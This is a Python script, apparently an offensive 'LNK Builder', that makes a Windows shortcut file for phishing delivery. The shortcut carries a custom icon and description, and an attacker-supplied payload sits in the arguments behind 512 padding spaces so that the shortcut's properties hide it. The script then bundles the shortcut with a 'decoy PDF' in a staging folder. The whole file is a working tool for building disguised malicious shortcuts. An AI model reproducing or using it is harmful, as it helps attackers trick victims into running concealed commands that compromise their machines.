import os
import sys
import winshell
import json 
import tempfile
import shutil

def generate_lnk(config):
    lnk_filename = config.get("lnk_filename")
    lnk_description = config.get("lnk_description")
    lnk_icon = config.get("lnk_icon")
    exe_path = config.get("exe_path")
    payload = config.get("payload")

    lnk_filepath = os.getcwd() + "\\" + lnk_filename + ".lnk"

    try:
        with winshell.shortcut(lnk_filepath) as lnk:
            lnk.path = exe_path
            lnk.icon_location = lnk_icon, 0
            lnk.description = lnk_description
            lnk.arguments = " "*512 + payload
        print("  [+] LNK Generated")
    except Exception as e:
       print("[-] Error ", e)

   
if __name__ == "__main__":
    print(
        """        
  _      _   _ _  __  ____        _ _     _           
 | |    | \ | | |/ / |  _ \      (_) |   | |          
 | |    |  \| | ' /  | |_) |_   _ _| | __| | ___ _ __ 
 | |    | . ` |  <   |  _ <| | | | | |/ _` |/ _ \ '__|
 | |____| |\  | . \  | |_) | |_| | | | (_| |  __/ |   
 |______|_| \_|_|\_\ |____/ \__,_|_|_|\__,_|\___|_|   
        """
    )
    if len(sys.argv) != 2:
        print("Usage: python script.py config.json")
    else:
        # Get config file
        config_file = sys.argv[1]

        # Path of the script directory
        script_dir = os.path.dirname(__file__)
        # Path of the temporary directory
        temp_dir = tempfile.mkdtemp(dir=script_dir)

        # Path of the source directory
        source_dir = "source"
        # List of files in the source directory
        source_files = os.listdir(source_dir)
        # Filter files with the ".pdf" extension
        pdf_files = [file for file in source_files if file.lower().endswith(".pdf")]
        if pdf_files:
            # Get the first found PDF file
            pdf_filename = pdf_files[0]
            # Copy the contents of the source directory to the temporary directory
            for file in source_files:
                source_path = os.path.join(script_dir, source_dir, file)
                dest_path = os.path.join(temp_dir, file)
                shutil.copy(source_path, dest_path)
            try:
                with open(config_file, 'r') as f:
                    config = json.load(f)
                    generate_lnk(config)
                # Path of the lnk file created by the create_lnk.py script
                lnk_name_processed = config.get("lnk_filename") + ".lnk"
                # Move the lnk file to the temporary directory
                shutil.move(lnk_name_processed, os.path.join(temp_dir, lnk_name_processed))
            except FileNotFoundError:
                print("Config file not found.")
            except json.JSONDecodeError:
                print("Invalid JSON format in config file.")
        else:
            print("No decoy PDF file found in the source folder.")

    # You can add other actions here if necessary
    print(f"The script executed successfully. Temporary directory: {temp_dir}")
